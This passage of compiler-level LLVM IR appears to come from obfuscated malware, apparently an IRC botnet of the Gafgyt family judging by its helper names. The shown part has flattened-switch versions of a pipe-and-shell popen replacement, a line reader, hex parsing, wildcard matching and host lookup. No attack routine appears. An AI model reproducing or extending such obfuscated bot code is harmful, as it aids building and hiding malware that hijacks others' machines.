  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -1744192972, i32 1597075361
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 -969180227, i32 -2099604732
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 -1121652854, i32 10600345
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 1597075361, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1191764991, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -2030352216, i32 -1858577670
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 1375302514, i32 100316055
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -617971862, i32 100316055
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 1441012026, i32 -196323865
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -376994151, i32 -1625232556
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 -1625232556, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1385738798, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -1122607262, i32 1005238355
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 1005238355, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1385738798, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 1496634611, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 179824884, i32 -1601560934
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 1838691760, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 1838691760, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -1767870497, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -674186952, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -674186952, label %first
    i32 234249679, label %13
    i32 -1440386426, label %21
    i32 -1792219215, label %22
    i32 1515881231, label %30
    i32 -498371436, label %37
    i32 1575471420, label %41
    i32 502913041, label %45
    i32 1865222072, label %47
    i32 1991676512, label %56
    i32 -664354555, label %57
    i32 545972089, label %64
    i32 441557163, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -1440386426, i32 234249679
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -1440386426, i32 -1792219215
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 441557163, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 1515881231, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -498371436, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 1575471420, i32 502913041
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 502913041, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 1515881231, i32 1865222072
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 1991676512, i32 -664354555
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 545972089, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 545972089, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 441557163, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -444006485, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -444006485, label %9
    i32 -572227606, label %13
    i32 -1521953248, label %18
    i32 -654463903, label %27
    i32 1531912473, label %29
    i32 -338648551, label %39
    i32 1154600484, label %43
    i32 548894970, label %44
    i32 1380319665, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -572227606, i32 -654463903
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -1521953248, i32 -654463903
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -654463903, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 1531912473, i32 -338648551
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -444006485, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 1154600484, i32 548894970
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1380319665, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 1380319665, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 1370968230, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1370968230, label %4
    i32 903837215, label %10
    i32 -2030808335, label %13
    i32 1964925709, label %15
    i32 1370798743, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 903837215, i32 -2030808335
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 -2030808335, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 1964925709, i32 1370798743
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 1370968230, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1117526818, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1117526818, label %NodeBlock5
    i32 37037068, label %NodeBlock
    i32 -277156188, label %LeafBlock3
    i32 54202262, label %LeafBlock1
    i32 -423288441, label %LeafBlock
    i32 -1174425425, label %14
    i32 693843925, label %18
    i32 1280476896, label %25
    i32 613099365, label %31
    i32 -1788381189, label %38
    i32 -945662121, label %39
    i32 -639895771, label %42
    i32 1936281466, label %48
    i32 1016778794, label %56
    i32 -1036100245, label %NewDefault
    i32 1804285072, label %59
    i32 885231676, label %70
    i32 -863013287, label %78
    i32 -37341199, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 -423288441, i32 37037068
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 54202262, i32 -277156188
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -639895771, i32 -1036100245
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 693843925, i32 -1036100245
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -1174425425, i32 -1036100245
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -37341199, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 1280476896, i32 -945662121
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 613099365, i32 -1788381189
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -1788381189, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -945662121, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -37341199, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 1936281466, i32 1016778794
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1016778794, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -37341199, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1804285072, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 885231676, i32 -863013287
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 -863013287, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -37341199, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1176064649, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1176064649, label %first
    i32 1650433718, label %13
    i32 -909537342, label %14
    i32 -55266958, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 1650433718, i32 -909537342
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -55266958, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -55266958, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -1295811761, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1295811761, label %3
    i32 1271763603, label %8
    i32 930370828, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
